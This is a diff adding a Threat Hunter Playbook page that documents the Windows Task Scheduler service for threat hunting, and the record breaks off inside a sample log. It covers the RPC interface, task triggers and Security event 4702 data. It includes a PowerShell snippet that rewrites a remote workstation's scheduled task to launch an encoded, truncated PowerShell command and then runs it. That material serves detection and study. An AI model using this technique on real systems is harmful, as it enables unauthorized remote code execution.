@@ -1,0 +1,634 @@
+
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Task Scheduler Service &#8212; Threat Hunter Playbook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
+    <link href="../_static/css/index.css" rel="stylesheet">
+    <link rel="stylesheet" href="../_static/sphinx-book-theme.css" type="text/css" />
+    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/sphinx-dropdown.css" />
+    <script id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
+    <script src="../_static/jquery.js"></script>
+    <script src="../_static/underscore.js"></script>
+    <script src="../_static/doctools.js"></script>
+    <script src="../_static/language_data.js"></script>
+    <script src="../_static/togglebutton.js"></script>
+    <script src="../_static/clipboard.min.js"></script>
+    <script src="../_static/copybutton.js"></script>
+    <script src="../_static/sphinx-book-theme.js"></script>
+    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/x-mathjax-config">MathJax.Hub.Config({"tex2jax": {"inlineMath": [["\\(", "\\)"]], "displayMath": [["\\[", "\\]"]], "processRefs": false, "processEnvironments": false}})</script>
+    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
+    <script >
+        const thebe_selector = ".thebe,.cell"
+        const thebe_selector_input = "pre,.cell_input div.highlight"
+        const thebe_selector_output = ".output,.cell_output"
+    </script>
+    <script async="async" src="../_static/sphinx-thebe.js"></script>
+    <link rel="canonical" href="https://threathunterplaybook.com/library/task_scheduler_service.html" />
+    <link rel="shortcut icon" href="../_static/favicon.ico"/>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="docsearch:language" content="en">
+
+
+<!-- Opengraph tags -->
+<meta property="og:url"         content="https://threathunterplaybook.com/library/task_scheduler_service.html" />
+<meta property="og:type"        content="article" />
+<meta property="og:title"       content="Task Scheduler Service" />
+<meta property="og:description" content="Task Scheduler Service  The Task Scheduler service allows you to perform automated tasks on a chosen computer. With this service, you can schedule any program t" />
+<meta property="og:image"       content="https://threathunterplaybook.com/_static/logo.png" />
+
+<meta name="twitter:card" content="summary" />
+
+
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+<a class="navbar-brand text-wrap" href="../index.html">
+  
+  <img src="../_static/logo.png" class="logo" alt="logo">
+  
+  
+  <h1 class="site-logo" id="site-title">Threat Hunter Playbook</h1>
+  
+</a>
+</div>
+
+<form class="bd-search d-flex align-items-center" action="../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form>
+
+<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
+  <p class="caption">
+ <span class="caption-text">
+  Knowledge Library
+ </span>
+</p>
+<ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="windows/intro.html">
+   Windows
+  </a>
+ </li>
+</ul>
+<p class="caption">
+ <span class="caption-text">
+  Pre-Hunt Activities
+ </span>
+</p>
+<ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../pre-hunt/data_management.html">
+   Data Management
+  </a>
+ </li>
+</ul>
+<p class="caption">
+ <span class="caption-text">
+  Campaign Notebooks
+ </span>
+</p>
+<ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../evals/intro.html">
+   ATT&amp;CK Evaluations
+  </a>
+ </li>
+</ul>
+<p class="caption">
+ <span class="caption-text">
+  Targeted Notebooks
+ </span>
+</p>
+<ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../notebooks/windows/intro.html">
+   Windows
+  </a>
+ </li>
+</ul>
+<p class="caption">
+ <span class="caption-text">
+  Tutorials
+ </span>
+</p>
+<ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../tutorials/jupyter/introduction.html">
+   Jupyter Notebooks
+  </a>
+ </li>
+</ul>
+
+</nav>
+
+ <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="row topbar fixed-top container-xl">
+    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
+    </div>
+    <div class="col pl-2 topbar-main">
+        
+        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+            <i class="fas fa-bars"></i>
+            <i class="fas fa-arrow-left"></i>
+            <i class="fas fa-arrow-up"></i>
+        </button>
+        
+        <div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="../_sources/library/task_scheduler_service.md"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.md</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+    
+</div>
+        <!-- Source interaction buttons -->
+
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
+        aria-label="Connect with source repository"><i class="fab fa-github"></i></button>
+    <div class="dropdown-buttons sourcebuttons">
+        <a class="repository-button"
+            href="https://github.com/OTRF/ThreatHunter-Playbook"><button type="button" class="btn btn-secondary topbarbtn"
+                data-toggle="tooltip" data-placement="left" title="Source repository"><i
+                    class="fab fa-github"></i>repository</button></a>
+        <a class="issues-button"
+            href="https://github.com/OTRF/ThreatHunter-Playbook/issues/new?title=Issue%20on%20page%20%2Flibrary/task_scheduler_service.html&body=Your%20issue%20content%20here."><button
+                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
+                title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
+        <a class="edit-button" href="https://github.com/OTRF/ThreatHunter-Playbook/edit/master/docs/library/task_scheduler_service.md"><button
+                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
+                title="Edit this page"><i class="fas fa-pencil-alt"></i>suggest edit</button></a>
+    </div>
+</div>
+
+
+        <!-- Full screen (wrap in <a> to have style consistency -->
+        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
+                    class="fas fa-expand"></i></button></a>
+
+        <!-- Launch buttons -->
+
+    </div>
+
+    <!-- Table of contents -->
+    <div class="d-none d-md-block col-md-2 bd-toc show">
+        <div class="tocsection onthispage pt-5 pb-3">
+            <i class="fas fa-list"></i> Contents
+        </div>
+        <nav id="bd-toc-nav">
+            <ul class="nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#task-scheduler-service-remote-protocol">
+   Task Scheduler Service Remote Protocol
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#rpc-methods">
+   RPC Methods
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#task-actions">
+   Task Actions
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#task-triggers">
+   Task Triggers
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#interact-with-task-scheduler-remotely">
+   Interact with Task Scheduler Remotely
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#powershell-schedule-service-com-object">
+     Powershell - Schedule.Service COM Object
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#security-event-logs">
+   Security Event Logs
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#security-log">
+     Security Log
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#microsoft-windows-taskscheduler-operational-logs">
+     Microsoft-Windows-TaskScheduler/Operational Logs
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#sysmon">
+   Sysmon
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#references">
+   References
+  </a>
+ </li>
+</ul>
+
+        </nav>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+        
+              <div>
+                
+  <div class="section" id="task-scheduler-service">
+<h1>Task Scheduler Service<a class="headerlink" href="#task-scheduler-service" title="Permalink to this headline">¶</a></h1>
+<p>The Task Scheduler service allows you to perform automated tasks on a chosen computer. With this service, you can schedule any program to run at a convenient time for you or when a specific event occurs.</p>
+<div class="section" id="task-scheduler-service-remote-protocol">
+<h2>Task Scheduler Service Remote Protocol<a class="headerlink" href="#task-scheduler-service-remote-protocol" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><strong>RPC Server</strong></p>
+<ul>
+<li><p><strong>Name</strong>: ITaskSchedulerService</p></li>
+<li><p><strong>UUID</strong>: 86d35949-83c9-4044-b424-db363231fd0c</p></li>
+<li><p><strong>FilePath</strong>: C:\Windows\System32\schedsvc.dll</p></li>
+</ul>
+</li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">InterfaceId</span>           <span class="p">:</span> <span class="mi">86</span><span class="n">d35949</span><span class="o">-</span><span class="mi">83</span><span class="n">c9</span><span class="o">-</span><span class="mi">4044</span><span class="o">-</span><span class="n">b424</span><span class="o">-</span><span class="n">db363231fd0c</span>
+<span class="n">InterfaceVersion</span>      <span class="p">:</span> <span class="mf">1.0</span>
+<span class="n">TransferSyntaxId</span>      <span class="p">:</span> <span class="mi">8</span><span class="n">a885d04</span><span class="o">-</span><span class="mi">1</span><span class="n">ceb</span><span class="o">-</span><span class="mi">11</span><span class="n">c9</span><span class="o">-</span><span class="mi">9</span><span class="n">fe8</span><span class="o">-</span><span class="mi">08002</span><span class="n">b104860</span>
+<span class="n">TransferSyntaxVersion</span> <span class="p">:</span> <span class="mf">2.0</span>
+<span class="n">ProcedureCount</span>        <span class="p">:</span> <span class="mi">20</span>
+<span class="n">Procedures</span>            <span class="p">:</span> <span class="p">{</span><span class="n">SchRpcHighestVersion</span><span class="p">,</span> <span class="n">SchRpcRegisterTask</span><span class="p">,</span> <span class="n">SchRpcRetrieveTask</span><span class="p">,</span> <span class="n">SchRpcCreateFolder</span><span class="o">...</span><span class="p">}</span>
+<span class="n">Server</span>                <span class="p">:</span> <span class="n">UUID</span><span class="p">:</span> <span class="mi">86</span><span class="n">d35949</span><span class="o">-</span><span class="mi">83</span><span class="n">c9</span><span class="o">-</span><span class="mi">4044</span><span class="o">-</span><span class="n">b424</span><span class="o">-</span><span class="n">db363231fd0c</span>
+<span class="n">ComplexTypes</span>          <span class="p">:</span> <span class="p">{</span><span class="n">Struct_0</span><span class="p">,</span> <span class="n">Struct_1</span><span class="p">,</span> <span class="n">Struct_3</span><span class="p">}</span>
+<span class="n">FilePath</span>              <span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">System32</span>\<span class="n">schedsvc</span><span class="o">.</span><span class="n">dll</span>
+<span class="n">Name</span>                  <span class="p">:</span> <span class="n">schedsvc</span><span class="o">.</span><span class="n">dll</span>
+<span class="n">Offset</span>                <span class="p">:</span> <span class="mi">510656</span>
+<span class="n">ServiceName</span>           <span class="p">:</span> <span class="n">Schedule</span>
+<span class="n">ServiceDisplayName</span>    <span class="p">:</span> <span class="n">Task</span> <span class="n">Scheduler</span>
+<span class="n">IsServiceRunning</span>      <span class="p">:</span> <span class="kc">True</span>
+<span class="n">Endpoints</span>             <span class="p">:</span> <span class="p">{[</span><span class="mi">86</span><span class="n">d35949</span><span class="o">-</span><span class="mi">83</span><span class="n">c9</span><span class="o">-</span><span class="mi">4044</span><span class="o">-</span><span class="n">b424</span><span class="o">-</span><span class="n">db363231fd0c</span><span class="p">,</span> <span class="mf">1.0</span><span class="p">]</span> <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">LRPC</span><span class="o">-</span><span class="mi">4803</span><span class="n">de23b17986468a</span><span class="p">],</span> <span class="p">[</span><span class="mi">86</span><span class="n">d35949</span><span class="o">-</span><span class="mi">83</span><span class="n">c9</span><span class="o">-</span><span class="mi">4044</span><span class="o">-</span><span class="n">b424</span><span class="o">-</span><span class="n">db363231fd0c</span><span class="p">,</span> <span class="mf">1.0</span><span class="p">]</span> <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">ubpmtaskhostchannel</span><span class="p">],</span> 
+                        <span class="p">[</span><span class="mi">86</span><span class="n">d35949</span><span class="o">-</span><span class="mi">83</span><span class="n">c9</span><span class="o">-</span><span class="mi">4044</span><span class="o">-</span><span class="n">b424</span><span class="o">-</span><span class="n">db363231fd0c</span><span class="p">,</span> <span class="mf">1.0</span><span class="p">]</span> <span class="n">ncalrpc</span><span class="p">:[</span><span class="n">LRPC</span><span class="o">-</span><span class="mi">83</span><span class="n">a142d94b8e74a91a</span><span class="p">]}</span>
+<span class="n">EndpointCount</span>         <span class="p">:</span> <span class="mi">3</span>
+<span class="n">Client</span>                <span class="p">:</span> <span class="kc">False</span> 
+</pre></div>
+</div>
+<ul class="simple">
+<li><p><strong>RPC Clients</strong>:</p>
+<ul>
+<li><p>taskcomp.dll</p></li>
+<li><p>taskschd.dll</p></li>
+<li><p>wmicmiplugin.dll</p></li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="section" id="rpc-methods">
+<h2>RPC Methods<a class="headerlink" href="#rpc-methods" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>SchRpcRegisterTask (Opnum 1)- The SchRpcRegisterTask method registers a task with the server (i.e. Updates).</p></li>
+<li><p>SchRpcRetrieveTask (Opnum 2) - The SchRpcRetrieveTask method returns a task definition.</p></li>
+<li><p>SchRpcRun (Opnum 12) - The SchRpcRun method runs a task specified by a path.</p></li>
+</ul>
+</div>
+<div class="section" id="task-actions">
+<h2>Task Actions<a class="headerlink" href="#task-actions" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>ComHandler Action - This action fires a COM handler.</p></li>
+<li><p>Exec Action -  This action executes a command-line operation such as starting Notepad.</p></li>
+<li><p>E-mail Action - This action sends an email when a task is triggered.</p></li>
+<li><p>Show Message Action - This action shows a message box with a specified message and title.</p></li>
+</ul>
+</div>
+<div class="section" id="task-triggers">
+<h2>Task Triggers<a class="headerlink" href="#task-triggers" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>TASK_TRIGGER_EVENT - 0 - Starts the task when a specific event occurs.</p></li>
+<li><p>TASK_TRIGGER_TIME - 1 - Starts the task at a specific time of day.</p></li>
+<li><p>TASK_TRIGGER_DAILY - 2 - Starts the task daily.</p></li>
+<li><p>TASK_TRIGGER_WEEKLY - 3 - Starts the task weekly.</p></li>
+<li><p>TASK_TRIGGER_MONTHLY - 4 - Starts the task monthly.</p></li>
+<li><p>TASK_TRIGGER_MONTHLYDOW - 5 - Starts the task every month on a specific day of the week.</p></li>
+<li><p>TASK_TRIGGER_IDLE - 6 - Starts the task when the computer goes into an idle state.</p></li>
+<li><p>TASK_TRIGGER_REGISTRATION - 7 - Starts the task when the task is registered.</p></li>
+<li><p>TASK_TRIGGER_BOOT - 8 - Starts the task when the computer boots.</p></li>
+<li><p>TASK_TRIGGER_LOGON - 9 - Starts the task when a specific user logs on.</p></li>
+<li><p>TASK_TRIGGER_SESSION_STATE_CHANGE - 11 - Triggers the task when a specific session state changes.</p></li>
+</ul>
+</div>
+<div class="section" id="interact-with-task-scheduler-remotely">
+<h2>Interact with Task Scheduler Remotely<a class="headerlink" href="#interact-with-task-scheduler-remotely" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="powershell-schedule-service-com-object">
+<h3>Powershell - Schedule.Service COM Object<a class="headerlink" href="#powershell-schedule-service-com-object" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-Powershell notranslate"><div class="highlight"><pre><span></span><span class="c"># connect to Task Scheduler:</span>
+<span class="nv">$service</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">Schedule</span><span class="p">.</span><span class="n">Service</span>
+<span class="nv">$service</span><span class="p">.</span><span class="n">Connect</span><span class="p">(</span><span class="s2">&quot;WORKSTATION6&quot;</span><span class="p">)</span>
+
+<span class="c"># Get task folder that contains tasks:</span>
+<span class="nv">$folder</span> <span class="p">=</span> <span class="nv">$service</span><span class="p">.</span><span class="n">GetFolder</span><span class="p">(</span><span class="s1">&#39;\Microsoft\Windows\&#39;</span><span class="p">)</span>
+
+<span class="c"># Example: Root Task Container:</span>
+<span class="nv">$folder</span> <span class="p">=</span> <span class="nv">$service</span><span class="p">.</span><span class="n">GetFolder</span><span class="p">(</span><span class="s1">&#39;\&#39;</span><span class="p">)</span>
+
+<span class="c"># Enumerate Specific Task</span>
+<span class="nv">$ward0gtask</span> <span class="p">=</span> <span class="nv">$folder</span><span class="p">.</span><span class="n">GetTask</span><span class="p">(</span><span class="s1">&#39;Ward0g&#39;</span><span class="p">)</span>
+<span class="nv">$alltasks</span> <span class="p">=</span> <span class="nv">$folder</span><span class="p">.</span><span class="n">GetTasks</span><span class="p">(</span><span class="n">0</span><span class="p">)</span>
+
+<span class="c"># get task definition and change it (i.e Arguments)</span>
+<span class="nv">$taskdefinition</span> <span class="p">=</span> <span class="nv">$ward0gtask</span><span class="p">.</span><span class="n">Definition</span>
+<span class="nv">$taskdefinition</span><span class="p">.</span><span class="n">Actions</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Path</span> <span class="p">=</span> <span class="s2">&quot;powershell&quot;</span><span class="p">}</span>
+<span class="nv">$taskdefinition</span><span class="p">.</span><span class="n">Actions</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s2">&quot;-noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAUwBpAE8AbgAuAE0AY....&quot;</span><span class="p">}</span>
+
+<span class="c"># write back changed task definition:</span>
+<span class="c"># 4 = Update</span>
+<span class="nv">$folder</span><span class="p">.</span><span class="n">RegisterTaskDefinition</span><span class="p">(</span><span class="nv">$task</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span> <span class="nv">$taskdefinition</span><span class="p">,</span> <span class="n">4</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="nv">$null</span><span class="p">)</span>
+
+<span class="c"># Execute Task</span>
+<span class="nv">$NewTask</span> <span class="p">=</span> <span class="nv">$folder</span><span class="p">.</span><span class="n">GetTask</span><span class="p">(</span><span class="s2">&quot;Ward0g&quot;</span><span class="p">)</span>
+<span class="nv">$NewTask</span><span class="p">.</span><span class="n">run</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(@(</span><span class="s1">&#39;&#39;</span><span class="p">))</span>
+
+<span class="c"># Stop Task</span>
+<span class="nv">$NewTask</span><span class="p">.</span><span class="n">stop</span><span class="p">(</span><span class="n">0</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="security-event-logs">
+<h2>Security Event Logs<a class="headerlink" href="#security-event-logs" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="security-log">
+<h3>Security Log<a class="headerlink" href="#security-log" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li><p>EventID 4624: Successful Logon</p></li>
+<li><p>EventID 4702 (Target): A Scheduled Task Was updated</p></li>
+</ul>
+<div class="highlight-xml notranslate"><div class="highlight"><pre><span></span>- <span class="nt">&lt;Event</span> <span class="na">xmlns=</span><span class="s">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span><span class="nt">&gt;</span> 
+    - <span class="nt">&lt;System&gt;</span> 
+        <span class="nt">&lt;Provider</span> <span class="na">Name=</span><span class="s">&quot;Microsoft-Windows-Security-Auditing&quot;</span> <span class="na">Guid=</span><span class="s">&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;EventID&gt;</span>4702<span class="nt">&lt;/EventID&gt;</span> 
+        <span class="nt">&lt;Version&gt;</span>1<span class="nt">&lt;/Version&gt;</span> 
+        <span class="nt">&lt;Level&gt;</span>0<span class="nt">&lt;/Level&gt;</span> 
+        <span class="nt">&lt;Task&gt;</span>12804<span class="nt">&lt;/Task&gt;</span> 
+        <span class="nt">&lt;Opcode&gt;</span>0<span class="nt">&lt;/Opcode&gt;</span> 
+        <span class="nt">&lt;Keywords&gt;</span>0x8020000000000000<span class="nt">&lt;/Keywords&gt;</span> 
+        <span class="nt">&lt;TimeCreated</span> <span class="na">SystemTime=</span><span class="s">&quot;2020-12-16T17:12:22.000309100Z&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;EventRecordID&gt;</span>2292968<span class="nt">&lt;/EventRecordID&gt;</span> 
+        <span class="nt">&lt;Correlation</span> <span class="na">ActivityID=</span><span class="s">&quot;{262c1204-cb81-0000-0dbf-29867cced601}&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;Execution</span> <span class="na">ProcessID=</span><span class="s">&quot;740&quot;</span> <span class="na">ThreadID=</span><span class="s">&quot;1560&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;Channel&gt;</span>Security<span class="nt">&lt;/Channel&gt;</span> 
+        <span class="nt">&lt;Computer&gt;</span>WORKSTATION6.theshire.local<span class="nt">&lt;/Computer&gt;</span> 
+        <span class="nt">&lt;Security</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;/System&gt;</span> 
+    - <span class="nt">&lt;EventData&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;SubjectUserSid&quot;</span><span class="nt">&gt;</span>S-1-5-21-3786818125-2382361537-3207726629-1104<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;SubjectUserName&quot;</span><span class="nt">&gt;</span>pgustavo<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;SubjectDomainName&quot;</span><span class="nt">&gt;</span>THESHIRE<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;SubjectLogonId&quot;</span><span class="nt">&gt;</span>0x9ac216f<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;TaskName&quot;</span><span class="nt">&gt;</span>\Ward0g<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;TaskContentNew&quot;</span><span class="nt">&gt;</span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;</span> <span class="nt">&lt;Task</span> <span class="na">version=</span><span class="s">&quot;1.2&quot;</span> <span class="na">xmlns=</span><span class="s">&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;</span><span class="nt">&gt;</span> <span class="nt">&lt;RegistrationInfo&gt;</span> <span class="nt">&lt;Date&gt;</span>2020-12-16T08:09:21.4521839<span class="nt">&lt;/Date&gt;</span> <span class="nt">&lt;Author&gt;</span>THESHIRE\sbeavers<span class="nt">&lt;/Author&gt;</span> <span class="nt">&lt;Description&gt;</span>Que pasa<span class="nt">&lt;/Description&gt;</span> <span class="nt">&lt;URI&gt;</span>\Ward0g<span class="nt">&lt;/URI&gt;</span> <span class="nt">&lt;/RegistrationInfo&gt;</span> <span class="nt">&lt;Triggers&gt;</span> <span class="nt">&lt;RegistrationTrigger&gt;</span> <span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span> <span class="nt">&lt;/RegistrationTrigger&gt;</span> <span class="nt">&lt;/Triggers&gt;</span> <span class="nt">&lt;Principals&gt;</span> <span class="nt">&lt;Principal</span> <span class="na">id=</span><span class="s">&quot;Author&quot;</span><span class="nt">&gt;</span> <span class="nt">&lt;UserId&gt;</span>S-1-5-21-3786818125-2382361537-3207726629-1106<span class="nt">&lt;/UserId&gt;</span> <span class="nt">&lt;LogonType&gt;</span>InteractiveToken<span class="nt">&lt;/LogonType&gt;</span> <span class="nt">&lt;RunLevel&gt;</span>LeastPrivilege<span class="nt">&lt;/RunLevel&gt;</span> <span class="nt">&lt;/Principal&gt;</span> <span class="nt">&lt;/Principals&gt;</span> <span class="nt">&lt;Settings&gt;</span> <span class="nt">&lt;MultipleInstancesPolicy&gt;</span>IgnoreNew<span class="nt">&lt;/MultipleInstancesPolicy&gt;</span> <span class="nt">&lt;DisallowStartIfOnBatteries&gt;</span>true<span class="nt">&lt;/DisallowStartIfOnBatteries&gt;</span> <span class="nt">&lt;StopIfGoingOnBatteries&gt;</span>true<span class="nt">&lt;/StopIfGoingOnBatteries&gt;</span> <span class="nt">&lt;AllowHardTerminate&gt;</span>true<span class="nt">&lt;/AllowHardTerminate&gt;</span> <span class="nt">&lt;StartWhenAvailable&gt;</span>false<span class="nt">&lt;/StartWhenAvailable&gt;</span> <span class="nt">&lt;RunOnlyIfNetworkAvailable&gt;</span>false<span class="nt">&lt;/RunOnlyIfNetworkAvailable&gt;</span> <span class="nt">&lt;IdleSettings&gt;</span> <span class="nt">&lt;StopOnIdleEnd&gt;</span>true<span class="nt">&lt;/StopOnIdleEnd&gt;</span> <span class="nt">&lt;RestartOnIdle&gt;</span>false<span class="nt">&lt;/RestartOnIdle&gt;</span> <span class="nt">&lt;/IdleSettings&gt;</span> <span class="nt">&lt;AllowStartOnDemand&gt;</span>true<span class="nt">&lt;/AllowStartOnDemand&gt;</span> <span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span> <span class="nt">&lt;Hidden&gt;</span>false<span class="nt">&lt;/Hidden&gt;</span> <span class="nt">&lt;RunOnlyIfIdle&gt;</span>false<span class="nt">&lt;/RunOnlyIfIdle&gt;</span> <span class="nt">&lt;WakeToRun&gt;</span>false<span class="nt">&lt;/WakeToRun&gt;</span> <span class="nt">&lt;ExecutionTimeLimit&gt;</span>PT72H<span class="nt">&lt;/ExecutionTimeLimit&gt;</span> <span class="nt">&lt;Priority&gt;</span>7<span class="nt">&lt;/Priority&gt;</span> <span class="nt">&lt;/Settings&gt;</span> <span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">&quot;Author&quot;</span><span class="nt">&gt;</span> <span class="nt">&lt;Exec&gt;</span> <span class="nt">&lt;Command&gt;</span>powershell<span class="nt">&lt;/Command&gt;</span> <span class="nt">&lt;Arguments&gt;</span>-noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAUwBwAt.....<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ClientProcessStartKey&quot;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ClientProcessId&quot;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/Data&gt;</span> 
